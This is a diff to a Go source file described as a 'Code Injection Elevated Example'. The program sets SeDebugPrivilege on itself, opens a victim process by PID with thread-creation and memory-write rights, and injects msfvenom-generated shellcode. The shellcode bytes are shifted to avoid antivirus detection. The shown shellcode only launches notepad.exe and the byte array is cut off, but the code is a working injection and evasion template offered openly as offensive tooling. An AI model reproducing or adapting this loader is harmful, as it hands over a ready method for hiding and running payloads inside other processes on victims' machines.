@@ -1,5 +1,25 @@
-//+build windows
+// +build windows
 
+// Build only for Windows
+//
+// Copyright (C) 2020 secfurry
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with this program.  If not, see <https://www.gnu.org/licenses/>.
+//
+// Code Injection Elevated Example
+//   Will attempt to inject code that launches "notepad.exe" from the targeted process.
+//   This code will attempt to set the "SeDebugPrivilege" privilege on itself beforehand.
 package main
 
 import (
@@ -19,19 +39,18 @@ type TOKEN_PRIVILEGES struct {
 }
 
 func main() {
-
 	if len(os.Args) != 2 {
 		fmt.Fprintf(os.Stderr, "%s <pid>", os.Args[0])
 		os.Exit(1)
 	}
 
+	// OpenProcess request access rights
 	const requestRights = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
 		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
 		windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
 		windows.PROCESS_DUP_HANDLE | 0x001
 
 	var (
-
 		// Victim process ID
 		// Taken from command line.
 		targetPID, _ = strconv.Atoi(os.Args[1])
@@ -47,11 +66,13 @@ func main() {
 
 		// Load the functions from advapi32.dll that we need by name
 		funcAdjustTokenPrivileges = dllAdvapi32.NewProc("AdjustTokenPrivileges")
+
 		// Shellcode
 		// msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f c
 		// Payload size: 279 bytes
 		// Shifted 10 bytes right to prevent AV detection of shellcode.
-		shellcodeData = []byte("\x06\x52\x8d\xee\xfa\xf2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x5c\x5b\x60\x52\x3b\xdc" +
+		shellcodeData = []byte("" +
+			"\x06\x52\x8d\xee\xfa\xf2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x5c\x5b\x60\x52\x3b\xdc" +
 			"\x6f\x52\x95\x5c\x6a\x52\x95\x5c\x22\x52\x95\x5c\x2a\x52\x95\x7c\x5a\x52\x19\xc1" +
 			"\x54\x54\x57\x3b\xd3\x52\x3b\xca\xb6\x46\x6b\x86\x0c\x36\x2a\x4b\xcb\xd3\x17\x4b" +
 			"\x0b\xcb\xec\xf7\x5c\x4b\x5b\x52\x95\x5c\x2a\x95\x4c\x46\x52\x0b\xda\x95\x8a\x92" +
